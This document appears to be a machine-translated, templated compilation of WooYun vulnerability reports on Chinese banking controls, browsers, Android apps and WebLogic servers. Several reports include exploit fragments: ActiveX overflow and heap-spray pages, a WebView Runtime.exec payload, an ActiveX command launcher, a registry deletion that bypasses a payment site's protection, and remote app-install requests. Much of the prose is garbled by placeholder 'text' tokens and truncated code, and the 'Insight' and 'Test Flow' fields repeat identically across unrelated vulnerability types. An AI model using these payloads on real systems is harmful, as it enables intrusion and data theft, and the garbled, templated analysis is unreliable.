**Details**: **.**.**.**:7001/nweb/textservertext3389administrator privilegesenterservertranslated text,thennotaddaccount,administratortextlinetest

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-024077] SafeSignencryptcomponent Dll Hijacking(a certain lineonline bankingtext)
**Vendor**: SafeSign | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texthas peoplea certain textbankonline banking,useistextUKEY,textUKEYusedtextSafeSignencryptcomponent.thiscomponenttexttosysteminafter,willinnumbertextcertificatevalidationtextbecallto.componentwillloadonetextaetcmgrDLL,butthisDLLandnotbeinstalltosystemin,textcalltextnotspecifiedallpath.textthiswilltextonedll hijacking.for exampleIputonewillopenhttpstextwebpageandonetextaetcmgr.dllsendtranslated textonepersonalif,ifthattranslated textlineonline banking,IEthenwillinopenwebpagetextloadaetcmgr.dll.testwebpageas followsas follows,XXXtextreplaceasarbitraryonehttpstext:<head><meta http-equiv="refresh" content="0;url=https://XXXX"></html>aetcmgr.dll inDLLMAINinpartoneMSGBOX.IEcallstackas followsbecausethiscomponentistexttosystemin,sothisvulnerabilitycanlargecantext,willtexttotextvalidation

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: loadDLLtextuseallpath
---

---
### [wooyun-2016-0204078] translated textsecuritiesa certain testsystemhasvulnerability/textandtextcustomertextinformation/translated textinformation
**Vendor**: translated textsecurities | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlychecktextdataprove vulnerabilityhas,notranslated text,nottextcheckItranslated textthistestsystemhasJAVA weblogicdeserializationvulnerabilityconnectserver,textistestserver,systemtextallnotiswhentranslated textconnectdatadatabasecustomerinformation,has names,ID number,mobile phonenumber,translated textpoint109Wcustomerinformationdo not knowistextpersonnelinformation,emailallis@gaotime.com521 peopletextemaillook atshouldistextinformation,has names,mobile phonenumber,ID number,email,MSN,a certain Internet company,translated text4000manydo not knowistextSMS37WSMSthisistranslated texthandleinformationtext1000manyconnecttextonedatadatabaselook atlook attextiscustomerinformation,has names,mobile phonenumber,ID number,translated text1.5Wcustomerinformationdo not knowistextinformation100many

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: apply patchproductiondatatexttotestenvironmenttextredactedtext
---

---
### [wooyun-2015-0103131] a certain bankcontrolcodeinjectioncanobtainpasswordtextnottext
**Vendor**: a certain bank | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-027452] 139emaila certain pluginremote code execution vulnerability
**Vendor**: 139email | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: emailinsidetextthattexttoolpluginnotonlytextundertextthisoneissue,thentext peopletranslated textissuefile cxdndctrl.dll ([IP redacted])clsid   0CEFA82D-A26D-491C-BAF7-604441B409FDissuefunction setuserid()submittranslated textasParameterstextsetuserid ietextthispointtextcomeExecutioncommandhaspointtext translated texthastextcanselfgo backtext

**POC**: poc<html><object classid='clsid:0CEFA82D-A26D-491C-BAF7-604441B409FD' id='target'></object><script>var poc='';for (var i=0;i<44444;i++){poc +='A';}target.setuserid(poc);</script></html>

**Bypass**: Direct exploitation

**Fix**: checkinput
---

---
### [wooyun-2015-0118241] a certain video siteTVbeplant malwarecausinglarge amount ofusertextIEremoteexecution vulnerabilitytext(onetexta certain video siteTVwebsitetexttogethertext)
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: maliciousinformationtext

**Meta-thinking**: Trigger signal: functional testing

**Insight**: maliciousinformationtext lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify maliciousinformationtext-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain video siteTVpagehttps://example.com/[redacted])codetriggerafterwilltextcmd.exetextvbsscript,scriptrunafterdownloadhttp://[IP redacted] \putty.exerun.sousercancaninnottranslated textundertexttoIEcanexecution vulnerabilityimpact,translated textlargehastexthas

**POC**: useon

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2015-0141673] 2345look attexthas remote code execution vulnerability(withvulnerabilityPOC)
**Vendor**: 2345web directory | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 2345look attexthasDLLhijack,2345PicViewer.exeprocesswilltryloadimagesameonedirectoryQuserEx.dllfile,putimagefiletextmaliciousQuserEx.dllfileputinsameonedirectory,then cancauseremote code execution(usetranslated textTitlepackagesendtextvictim,victimtextafteropenthenwillaffected).

**POC**: textdownloadonelatest version2345look attext,translated textdownloadaddressashttps://example.com/[redacted] <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCES

**Bypass**: Direct exploitation

**Fix**: in2345PicViewer.exeprocessincallSetDllDirectory(""),putwhentextDLLtextdirectorysetastext.
---

---
### [wooyun-2016-0166969] a certain translated textplatformhasJavadeserializationvulnerability
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.vulnerabilitydescriptiontranslated textcloudtextplatform,weblogicserverhasjavadeserializationvulnerability2.vulnerabilityaddress**.**.**.**/oa/index.lp3.vulnerabilitycheckuseandexploitfoundcloudtextplatformadoptweblogicserver,textcheckwhetherhasjavadeserializationvulnerability

**POC**: checkresult,foundhas,administrator privileges

**Bypass**: Direct exploitation

**Fix**: textistextsinglepoint......textInvokerTransformer.class
---

---
### [wooyun-2012-08435] IEtext0dayvulnerability(CVE-2012-1889)
**Vendor**: Microsoft | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: IEtext0dayvulnerability(CVE-2012-1889),XMLcomponentnotnamedinsidetextdestroyvulnerability.

**POC**: from: https://example.com/[redacted] classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='ooxx'></object><script>var obj = document.getElementById('ooxx').object;var src = unescape("%u0c0c%u0c0c");while (src.len

**Bypass**: Direct exploitation

**Fix**: textsolution:https://example.com/[redacted]
---

---
### [wooyun-2014-079236] translated textapphasone locationtextallcertificatevulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: unauthorized access/authenticationBypass

**Meta-thinking**: Trigger signal: functional testing

**Insight**: unauthorized access/authenticationBypass lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify unauthorized access/authenticationBypass-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityimpact:textallcertificateputwillcausingman-in-the-middle attack,allcommunicationscontentallcanbeintercepttextpassword.andremote code execution vulnerabilityandtextserioussecurityvulnerabilitylinetext.

**POC**: mitm

**Bypass**: Direct exploitation

**Fix**: upgradeusea certain social platforma certain social platformSDK,usenovulnerabilitySDKversion.for examplehttps://example.com/[redacted]
---

---
### [wooyun-2012-08698] manyTOMintextremote code execution vulnerability
**Vendor**: TOMintext | **Year**: 2012 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: useParameterInterceptorinexcludeParamstextnamedsingleParametersrestrictiontextusetranslated text,for example"A-z0-9_.'"[]",text\()@needtext.
---

---
### [wooyun-2014-061143] texta certain softwareremotearbitrary code execution(hastext)
**Vendor**: a certain softwareVendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: WPStranslated textistextinsidetextpopularonetranslated textsoftware;appearissueislatest versioncopyWPS; itsinWPStext,whenwpp.exe intextopenonetextppt filetext,textwilltryloadonesystemnothasdll(uofswr.dll).causingcanexecute arbitrarycode.wpsintextinsideistranslated textsoftware.ifthisvulnerabilitylargetextexploit,impacttextlarge!textsoftwareversion:textlatest version,itstextversiontextnottest;triggermethod,indesktoponcreateone1.txt,itsincontentcanastextcanasarbitraryvalue;modify1.txt as 1.ppt or 1.pptx;thenput1.ppt and uofswr.dll (exploitdll,thisallwilltext!)putinsameonedirectory.onlytextwpp.exeopen,thensuccesstriggervulnerability!texttest,thisexploitmethodtextusewin XP ,win 7 ,win 8 ;textundertranslated text,textcanintranslated text,textcantextattack.thisvulnerabilityimpactisnotistextserious!!

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textnotload,textthentextonehas(allpath)
---

---
### [wooyun-2015-098445] a certain e-commerce platformIEsecuritycontrolcaninusertextunderbeBypass
**Vendor**: a certain e-commerce platform | **Year**: 2015 | **Type**: denial of service

**Meta-thinking**: Trigger signal: functional testing

**Insight**: denial of service lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify denial of service-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: on timesinWooYun: a certain texthasbanksecuritycontrolcancausingremotearbitrary code execution(texttypetextpoint)inItextaddtranslated textsiteimpact,cancoordinatetextlineonline bankingvulnerabilitycausingcode execution.this timestextitstextline,IfounditstexttrojanscantextBypassa certain e-commerce platformsecuritycontrol.translated textsingle,Ifounda certain e-commerce platformcontrolonlyhaswhen"Protected Mode"closetext,textcantranslated text.when"Protected Mode"translated text,textuseallno,butpagetextistextuserinputpassword.soBypasstexthandlethenisputa certain e-commerce platformwebsitetranslated textintextthen can.Internettextdefault settingistext"Protected Mode".thisonlyneeddeleteonetranslated textvaluethen can,notneedadministrator privileges.code is as follows:reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f

**POC**: 1,text peopletranslated text.ortexthttps://example.com/[redacted] delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f4,useIEopenhttps://example.com/[redacted]

**Bypass**: filterBypass

**Fix**: again timesproveaddtranslated textsiteishastranslated textnoonetext,sotextnottextmodifypermissions,nottextaddtextsite.translated textintextIEpermissionsundertextfunctionality.textnotif,nottextnottextcontrol.translated textonetranslated textItextonetextontextvulnerabilitycompletelynotextissue:youa certain e-commerce platformcancannottextoneunderTLSconfiguration?can refer tohttps://example.com/[redacted]
---

---
### [wooyun-2013-027592] a certain videoplayerarbitrary code execution vulnerability(withpoc)
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain videoplayertextprogramSHPlayer.exehasdllhijackrisk,SHPlayer.exeinloads at startupquserex.dllandvsfilter.lang,thesedllindoes not exist locally,iftextputthe above formatmediafileaddontextfortextmaliciousdllpack together,send to user.useropenthe above formatfile,thenwillExecutionmalware,high impact.

**POC**: 1,casually create peoplefilefolder,againputprove vulnerabilityquserex.dlltexttest.movputinonetogether,opentest.mov,thenwillloadquserex.dll,as shown below:2,pocdownloadaddress:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: useLoadLibrary APIloadDLLtextuseabsolute path
---

---
### [wooyun-2014-066523] a certain browserremote code execution vulnerability
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain browseristranslated texta certain communicationsVendortranslated textsend...a certain communicationsVendoristextcompany,sobrowservulnerabilitytextistextfollowtext~Webviewinterfaceremote code execution vulnerabilitytexthas- -.downloada certain browserhttps://example.com/[redacted]

**POC**: searchaddJavascriptInterfacethentextitsinzteHistoryconstructonewrite file+popupExp:<html><head><title>test</title></head><body><script>function execute(testcmd){return zteHistory.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webvie

**Bypass**: Direct exploitation

**Fix**: :)
---

---
### [wooyun-2016-0179538] a certain textAPPtextputportcancausingremoteinusermobile phoneopenarbitrarywebsiteurl
**Vendor**: a certain Internet company | **Year**: 2016 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textonehttp server,cometextthisport.portnumbertextcopytextshared_prefsdirectorymulti_process_config.xmlfileinsidetranslated textuseisNanoHTTPDcometextonehttp server,http servertexttodataafter,enterlineparse,thenenterlinelocationhandle,onetextisreturnonehttptext,thennottranslated text.butwhenheadertext GET /xxx?open_url=yyy formwhen,programwillExecutionthesecodetextcom.ss.android.action.openurlreceiver,willput extratextcome,whentextIntentdata,texttheniswetextURL,thentexttogethercomeActivity:this way,thencanremotetextmobile phoneopenarbitraryURL

**POC**: import httplibip = "**.**.**.**"port = 8192conn = httplib.HTTPConnection(ip,port)conn.request("GET","/detail?open_url=http://**.**.**.**")r1 = conn.getresponse()print r1.status, r1.reasondata = r1.read()print datafile:textURL,canusecomeinstallapp,oropenlocalfile,herethennotdescription

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-061520] hao123web directoryclientremote code execution vulnerability
**Vendor**: a certain search engine | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: hao123web directoryAndroidlatest versionremote code execution vulnerabilityhasvulnerabilityinterface:hao123_novel

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2016-0204421] textalsotranslated texta systemvulnerabilityleakageuseraccountpasswordandpersonalinformation/foundtranslated text
**Vendor**: textalsotranslated text | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlychecktextinformationprove vulnerabilityhas,notranslated text,nottextcheckItranslated textalsotranslated texttwoconsoleportal systemhasJAVA weblogicdeserializationvulnerabilityconnectserver,hasgoodtextcometextlook atundernetworklink,foundlcxstartlcxscriptgoodtextlcxprocessconnectdatadatabasecustomerinformation,has names,ID numberandtextpassword6000customerinformationcustomerinformation,has names,ID number,translated text,email,mobile phonenumber6000customerinformationlook atlook attextcustomertexthastextIonetextfollowers

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: apply patchcanreference:FixweblogicJAVAdeserializationvulnerabilitytextmethodhttp://**.**.**.**/web/13470
---

---
### [wooyun-2015-097499] a certain softwaremanagercancausingman-in-the-middle attackexecute arbitrarycode(needusertextprerequisite)
**Vendor**: a certain security vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: prerequisitetext:1,attackercantextandmodifyusernetworkrequest(texttypeintext).2,usertextopena certain softwaremanager,anddownloadarbitrarysoftware.3,downloadtextinneedhas1 timesuseroperation(thisoperationandtranslated text).texttoeffect:1,alltextnotext,noUAC,notranslated textoperation.2,useadministrator privilegestextrunarbitraryexefile.useundertext:Ifounda certain softwaremanagerindownloadsoftwaretext,No.onerequestis:1)https://example.com/[redacted]

**POC**: useunderisinlocaluseFiddlersimulationtextman-in-the-middle attackeffect:1,inFiddleraddtextundertranslated text:2,opena certain softwaremanagerarbitrarydownloadonetextsoftware("download","onetextinstall"textcan):3,directoryset,wetranslated text:4,textinstallafter"textintextlink":5,thisonetexthastext,becausetextinstalltextundernotwillintranslated textone times.thistexta certain softwaremanagershouldisfounddownloadfilehasissue.Ido not knowtextisnotistextnamedtext,textthisnottext,becausetextonlytext"translated text",textnotranslated text,Itextlargetextnumberuserthistextnotwillhastranslated text,largetranslated textonetextpointtextputtranslated text.6,textdownloadafter,textnotranslated text:7,thentrojansthenuseadministrator privilegestextExecution:textwithonehomepagedownloadexample:allnetworkrequest,textreference:

**Bypass**: Direct exploitation

**Fix**: isnotisyouin"translated text"beforehastextone timestext,usertextaftertranslated text?ifisif,infoundhasissuetranslated textdownload,andtextuser.iftextthentextnamedtextif,this onetexthas.
---

---
### [wooyun-2015-0144651] translated textAndroidclientaccountpasswordlocalplaintextstoreandcanberemotesteal
**Vendor**: a certain textwebsite | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.accountpasswordlocalplaintextstore.2.exploitwebviewvulnerabilityremotesteallocalaccountpassworddata.

**POC**: Androidclientdownloadaddress:http://**.**.**.**/app/apk  : com.eastmoney.android.fund, 53, 4.0.2, translated textapkmd5: 9e317ff54f4b603860ff43a80a3a3cd8certificate :certmd5: 80a7ddcbbd0574f59f1acbfda7b967dfissuer: O=eastmoneysubject: O=eastmoneyaccounttextplaintextstoreinlocaleastmoney.xmlfilein:usertextnamed,mobile phonenumber,accountID,textpasswordplaintextstore:passwordplaintextstore:ID number,tokeninformation,mobile phonenumberplaintextstore:putwebview

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0153353] wormholeNo.twopartcometext:a certain security vendora certain textusecanremotetextinstallapp
**Vendor**: a certain security vendor | **Year**: 2015 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textversioninformation3.2.57 Google playtext,canbetextcontrol3.2.68 translated text,onlycanbe360texttrigger3.4.70 translated textbetatext,onlycanbe360texttrigger5.0.15 translated text,canbetextcontroltheoreticallyon3.2.68beforeversionuseandtextversiontexttotext,(aftertexttesttranslated textreturn versioncode translated textthispoint)---Vulnerability AnalysisNanoHttpdtext38517porttextinterfaceas followstranslated text,textnextanalysistwo peopletextinterface in (remotetextinstall app) openBrowser(remoteopenarbitrarywebpage)ininterfacetextas followsParameterswillhasone sign validation,translated textsingleisput url andonetext salt md5text hash valueopenBrowsertextfortextastextonepoint,forParametersenterline aes encrypt,textfortextquestiontextenterlinerestriction.nottextbecause aes keytextcodecanBypass,textvalidationuse endswith textiscanBypassParametersonlytextone

**POC**: ---text poctextinstall:curl -H "http-client-ip: **.**.**.**" -H "remote-addr: **.**.**.**" -e http://**.**.**.**/ **.**.**.**:38517/in?url=http%3A%2f%**.**.**.**%2f151105%2f2056cf106ef74bb62f6cf90942d44893%2fcom.qihoo.freewifi_350.apk&sign=8d893b4713f324f776141a6fd25dae58&logo=1&name=2&ref=3&log=4SERVER INTE

**Bypass**: filterBypass, encoding bypass

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-039807] computersecuritymanagerremote executioncode
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: computersecuritymanagerinnetworkprotectionwhen,hasonedllhijack,TSWebShieldInject.dllis oneprotectiontranslated textinjectionmodule.whentextprocessbeinjectionafter,loadlibrarytextlocationhandleabsolute path.Ionlytestbrowsertext,textcancantextTypetexthasissue.soissuecanlargecantext.exploitwhencanconstructonehtmlfileinwebdev.Ithenlocaltestunder,win XP + IE 6insidetext.htmlfilesamedirectoryputoneieframe.dll,opentriggertext:a certain Internet companysecurityinhearttextieframe.dllisIE6issue,thattextVendorbrowserselfinstallinIE6environmentundertextonepointissuealltext,translated text peoplemanagerthenbehijack?text timesallpoc,analysistext.text people5ktogethertextItranslated textanalysistext,textpointtextranktextItextthennotvaluetext?.issueonlyistextfound,sosubmit.

**POC**: a certain securitybrowsera certain search enginebrowsera certain browsera certain Internet companyselfbrowser

**Bypass**: Direct exploitation

**Fix**: translated textistext
---

---
### [wooyun-2012-016450] SAPbuffer overflowexecute arbitrarycodevulnerability
**Vendor**: SAPtranslated textputsoftware | **Year**: 2012 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: SAPis oneplayer,starttextforHISTORY.PLAcontentnotverify,causingbuffer overflowexecute arbitrarycode.putfilecontentmodifyasas followscontent,triggervulnerability.pocas follows:0x41, 0x41, 0x41, 0x41, 0x7E, 0x46, 0x41, 0x41,0x41, 0x7E, 0x4B, 0x41, 0x41, 0x41, 0x7E, 0x50,0x41, 0x41, 0x41, 0x7E, 0x55, 0x41, 0x41, 0x41,0x7E, 0x5A, 0x41, 0x41, 0x41, 0x20, 0x7E, 0x35,0x41, 0x41, 0x41, 0x7E, 0x30, 0x41, 0x41, 0x41,0x7E, 0x25, 0x41, 0x41, 0x41, 0x7E, 0x29, 0x41,0x41, 0x41, 0x7E, 0x43, 0x42, 0x41, 0x41, 0x7E

**POC**: textfiletextExecutionputHISTORY.PLAtextcan executeprogramdirectory,run,parttextcalc

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-066790] a certain computerVendortextundera certain browsercode execution
**Vendor**: a certain computerVendor | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textbrowseristexta certain computerVendor(Lenovo)companytextsendonetranslated textforasusertranslated text peopletextmobile phonebrowser.thisbrowseristextontextallfunctionalitybrowser,texthasvideotextput,websitetext,search,download,personaldatamanagementetc.functionality,largetexthastextonotherproduct1/10text,isa certain textmobile phonetextbrowser.textbrowser([IP redacted]627)downloadlink(official):a certain computerVendortranslated texthasAndroidwebviewremote code execution vulnerabilityhasvulnerabilityinterface:searchBoxJavaBridge_greentea_webkit_jsgreentea

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0160361] translated texta certain managementsystemjavadeserializationexecution vulnerabilityadministrator privileges
**Vendor**: translated text | **Year**: 2015 | **Type**: successintrusion incident

**Meta-thinking**: Trigger signal: functional testing

**Insight**: successintrusion incident lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify successintrusion incident-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://**.**.**.**:7001/defaultroot/login.jsp

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-01451] a certain e-commerce platformptpusb.dllremotetextexecution vulnerability
**Vendor**: a certain e-commerce platform | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain e-commerce platform(Alipay)isa certain e-commerce platformsitetranslated textelectronictextintranslated textservice.a certain e-commerce platformtextinputcontroltextonhasvulnerability,remoteattackercancanexploitthisvulnerabilitycontrolusertext.a certain e-commerce platformtextinputcontrolptpusb.dllinhas remote code execution vulnerability.ptpusb.dlluseas followsmethodtextuseRemove()function:InprocServer32:    ptpusb.dllClassID      :     66F50F46-70A0-4A05-BD5E-FBCC0F9641EC[id(0x60030001), helpstring("method Remove")]void Remove([in] int idx);Remove()functionuseas followsmethodlocationhandleidxParameters:.text:10003D4E ; Remove.text:10003D4E.text:10003D4E sub_10003D4E    proc near

**POC**: Alipay ActiveX Remote Code Execute Exploit,enjoy it:)by CK(webmaster@leehoosoftware.org)

**Bypass**: Direct exploitation

**Fix**: asptpusb.dllsetkillbit,ordelete%system%\aliedit\ptpusb.dll.
---

---
### [wooyun-2011-01996] webXunleitextexecute arbitrarysystemcommandvulnerability
**Vendor**: Xunlei | **Year**: 2011 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: remote code execution lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify remote code execution-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: WebXunleiis onetextfortranslated textdownloadtool,translated textXunlei5operationtext,textdownloadtextpointtext,sametextuseallwebpagetextoperationtext,translated textuserusetext,istextinsideNo.onetextwebpageondownloadtool.WebXunleiintextonhastextvulnerability,programwilltextattackertextmaliciousParametersdirectlyExecution,remoteattackercanexploitthisvulnerabilitycontroluseraffectedsystem

**POC**: <html><head><title>Xunleiexecute arbitrarysystemcommand</title></head><body>runXunleiloadtext.<script>/***by long*/server = new ActiveXObject("ThunderServer.WebThunder.1");if(server==null){alert("textXunlei,textinstallwebXunlei");window.location.href="https://example.com/[redacted]";}else{server.OpenDirectory("cmd");alert("textItranslated text?");alert("translated text!text!translated textnot

**Bypass**: Direct exploitation

**Fix**: XunLei------textVendortextnotextPatchorupgradeprogram,werecommendusethissoftwareusertextfollowVendorhomepageuseobtainlatest versioncopy:https://example.com/[redacted]
---

---
### [wooyun-2013-036046] a certain translated texthas remote code execution vulnerability
**Vendor**: a certain translated text | **Year**: 2013 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-068707] Discuz! 7.2SQL injectionvulnerabilitytextcodeexecution vulnerability
**Vendor**: Discuz! | **Year**: 2014 | **Type**: SQL injectionvulnerability

**Meta-thinking**: Trigger signal: functional testing

**Insight**: SQL injectionvulnerability lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify SQL injectionvulnerability-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: on timessendvulnerabilitytexttorewardafter,look attextnotext,thenlook atonesomeothertextcode,translated texttogethercomeagainlook attextfoundonehastextvulnerability.indiscuz7.2insidehasonetextcodeinclude/search_sort.inc.phpfileinsidecode:@include_once DISCUZ_ROOT.'./forumdata/cache/threadsort_'.$selectsortid.'.php';textthis$selectsortidvariablenotranslated textlocationhandle,translated textaftertextentertoSQLquerytextinside:$query = $db->query("SELECT tid FROM {$tablepre}optionvalue$selectsortid ".($sqlsrch ? 'WHERE '.$sqlsrch : '')."");textwhenisintranslated textwebsitecanenterlineSQL injection,textfile inclusionintruncationmethodshouldcanintranslated textonenterlinearbitrarycode

**POC**: translated text:1,text - translated text - translated text (text)2,textadd textinformationtext3,textDetailsenterlinetextmodify,save4,createtextoptionvale{$sortid}text,onetext3start,text timesthencantextin.

**Bypass**: truncationattack

**Fix**: putinputtranslated textnumbertextType
---

---
### [wooyun-2016-0168529] a certain texthastextcompanyelectronictextplatformJavadeserializationvulnerability
**Vendor**: a certain translated text | **Year**: 2016 | **Type**: system/service patch not timely

**Meta-thinking**: Trigger signal: functional testing

**Insight**: system/service patch not timely lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify system/service patch not timely-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain translated textelectronictextplatformJavadeserializationvulnerability(Weblogic)nottextcome peopletextrank?textaddress:**.**.**.**:8000/logonAction.do

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: http://**.**.**.**/publish/main/9/2015/20151229124452251205640/20151229124452251205640_.htmlhttp://**.**.**.**/publish/main/9/2015/2015111914124858071
---

---
### [wooyun-2014-067752] Sogoumobile phoneappremote code execution
**Vendor**: Sogou | **Year**: 2014 | **Type**: remote code execution

**Meta-thinking**: Trigger signal: functional testing

